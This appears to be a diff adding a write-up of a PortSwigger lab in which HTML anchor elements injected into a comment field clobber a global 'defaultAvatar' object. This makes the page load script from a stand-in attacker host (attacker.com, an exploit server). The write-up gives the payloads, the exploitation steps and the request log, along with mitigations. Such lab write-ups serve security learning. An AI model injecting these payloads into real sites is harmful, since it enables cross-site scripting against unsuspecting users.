@@ -1,0 +1,208 @@
+# Clobbering DOM attributes to bypass HTML filters
+
+> **PortSwigger Web Security Academy**
+>
+> **Category:** DOM Clobbering
+>
+> **Difficulty:** Apprentice
+
+---
+
+# Summary
+
+This lab demonstrates how **DOM Clobbering** can be used to bypass HTML sanitization filters.
+
+Although `<script>` tags and common XSS vectors are blocked, the application loads a JavaScript file that reads the `defaultAvatar` property from the DOM. By abusing HTML element IDs and the browser's DOM resolution behavior, an attacker can overwrite this property and force the application to load an attacker-controlled JavaScript file.
+
+---
+
+# Objective
+
+Execute arbitrary JavaScript by abusing DOM Clobbering to overwrite a JavaScript object's property.
+
+---
+
+# Reconnaissance
+
+The page loads the following script:
+
+```html
+<script src="/resources/js/loadCommentsWithDomClobbering.js"></script>
+```
+
+Inspecting the JavaScript reveals that it reads a property similar to:
+
+```javascript
+let defaultAvatar = window.defaultAvatar || '/resources/images/avatarDefault.svg';
+```
+
+or
+
+```javascript
+element.src = defaultAvatar.avatar;
+```
+
+The application assumes that `defaultAvatar` is a legitimate JavaScript object.
+
+However, browsers automatically expose HTML elements with an `id` attribute as global variables.
+
+---
+
+# Understanding DOM Clobbering
+
+If the following HTML is injected:
+
+```html
+<a id="defaultAvatar"></a>
+<a id="defaultAvatar" name="avatar" href="https://attacker.com/exploit.js"></a>
+```
+
+the browser creates:
+
+```javascript
+window.defaultAvatar
+```
+
+instead of using the expected JavaScript object.
+
+As a result:
+
+```javascript
+defaultAvatar.avatar
+```
+
+returns:
+
+```text
+https://attacker.com/exploit.js
+```
+
+The application unknowingly loads attacker-controlled JavaScript.
+
+---
+
+# Attack Strategy
+
+The exploit consists of two components:
+
+1. A malicious JavaScript file hosted on the Exploit Server.
+2. A crafted HTML payload that clobbers the expected object.
+
+---
+
+## Malicious JavaScript
+
+Hosted on the Exploit Server:
+
+```javascript
+alert(document.domain);
+```
+
+---
+
+## DOM Clobbering Payload
+
+Injected into the comment field:
+
+```html
+<a id="defaultAvatar"></a>
+<a id="defaultAvatar"
+   name="avatar"
+   href="https://EXPLOIT-SERVER.exploit-server.net/exploit.js">
+</a>
+```
+
+When another user views the comment, the application loads:
+
+```text
+https://EXPLOIT-SERVER.exploit-server.net/exploit.js
+```
+
+instead of the default avatar resource.
+
+---
+
+# Exploitation Steps
+
+1. Open the Exploit Server.
+2. Create a JavaScript file containing:
+
+```javascript
+alert(document.domain);
+```
+
+3. Store the exploit.
+4. Submit the DOM Clobbering payload as a comment.
+5. Reload the page.
+6. Observe that the application requests the external JavaScript.
+7. The browser executes the attacker's script.
+
+---
+
+# Evidence
+
+The browser requests:
+
+```http
+GET /exploit.js HTTP/1.1
+Host: exploit-server.exploit-server.net
+```
+
+followed by successful JavaScript execution.
+
+---
+
+# Root Cause
+
+The application assumes that JavaScript variables cannot be overridden by HTML elements.
+
+However, browsers expose elements with an `id` attribute as global properties on the `window` object.
+
+This allows an attacker to replace expected JavaScript objects with attacker-controlled HTML elements.
+
+---
+
+# Impact
+
+An attacker can:
+
+* Execute arbitrary JavaScript.
+* Bypass HTML sanitization filters.
+* Hijack application logic.
+* Escalate to full Cross-Site Scripting (XSS).
+
+This technique is particularly dangerous when applications rely on global variables without proper validation.
+
+---
+
+# Mitigations
+
+Recommended defenses include:
+
+* Avoid relying on automatically created global DOM variables.
+* Use modules or scoped variables instead of global objects.
+* Sanitize user-controlled HTML.
+* Enforce a strict Content Security Policy (CSP).
+* Validate object types before using their properties.
+
+---
+
+# Key Takeaways
+
+* HTML elements with an `id` become global JavaScript variables.
+* DOM Clobbering can bypass filters that block traditional XSS payloads.
+* Modern JavaScript should avoid implicit global variables.
+* Trusted object references should always be validated before use.
+
+---
+
+# References
+
+* https://portswigger.net/web-security/dom-based/dom-clobbering
+* https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering
+
+---
+
+# Result
+
+✅ Successfully solved the lab by abusing DOM Clobbering to overwrite a trusted JavaScript object, forcing the application to load and execute attacker-controlled JavaScript.
